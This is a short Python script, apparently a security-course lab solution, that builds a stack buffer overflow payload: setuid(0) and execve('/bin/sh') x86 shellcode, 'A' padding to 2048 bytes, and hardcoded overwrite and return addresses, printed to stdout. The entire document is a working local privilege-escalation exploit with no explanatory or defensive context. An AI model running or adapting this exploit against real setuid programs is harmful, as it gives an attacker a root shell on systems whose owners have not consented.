import sys
import struct
from shellcode import shellcode

setuid = b'1\xdb\x8dC\x17\x99\xcd\x80'
bin_sh = (
    b'\xeb\x1f^\x89v\x081\xc0\x88F\x07\x89F\x0c\xb0\x0b\x89\xf3\x8dN\x08'
    b'\x8dV\x0c\xcd\x801\xdb\x89\xd8@\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')

shellcode = setuid + bin_sh

shell_address = struct.pack('<I', 0xfff6d8a8)

hex_num = 0xfff6e0bc
return_address = struct.pack('<I', hex_num);

padding_num = 2048 - len(shellcode)

buffer_fill = shellcode + b'A' * padding_num

exploit_string = buffer_fill + shell_address + return_address

sys.stdout.buffer.write(exploit_string)
